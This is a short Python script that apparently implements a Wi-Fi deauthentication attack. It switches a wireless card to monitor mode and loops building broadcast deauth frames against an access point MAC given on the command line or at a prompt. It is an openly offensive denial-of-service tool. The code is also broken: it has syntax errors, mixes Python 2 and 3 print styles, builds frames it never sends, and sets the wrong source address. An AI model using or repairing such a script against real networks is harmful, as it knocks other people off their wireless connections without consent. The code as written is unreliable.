import sys
import os
import time
import signal
from scapy.all import *
conf.verb = 0
conf.iface = "wlan0mon"

def init():
	os.system("airmon-ng check kill")
	os.system("ifconfig wlan0 down")
	os.system("iwconfig wlan0 mode monitor")
	os.system("ifconfig wlan0 up")
	os.system("iw dev wlan0 set channel 1")


def signal_handler(signal, frame):
	os.system("ifconfig wlan0 down")
	os.system("iwconfig wlan0 mode managed")
	os.system("ifconfig wlan0 up")
	os.system("service networking restart")
	os.system("service network-manager restart")
		
	print("\n Someone pressed ctrl+c")
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)



if __name__ == "__main__":
	init()
	client_mac = "ff:ff:ff:ff:ff:ff"
	if(len(sys.argv[]==1):
		ap_mac = raw_input("Please enter a mac address")
	else
		ap_mac = sys.argv[1]
	while True:
		deAuthFrame = RadioTap()/Dot11(addr1=client_mac, addr2=client_mac, addr3=ap_mac)/Dot11Deauth()
		print "DeAuth for AP", ap_mac,"and client",client_mac		
		time.sleep(1)
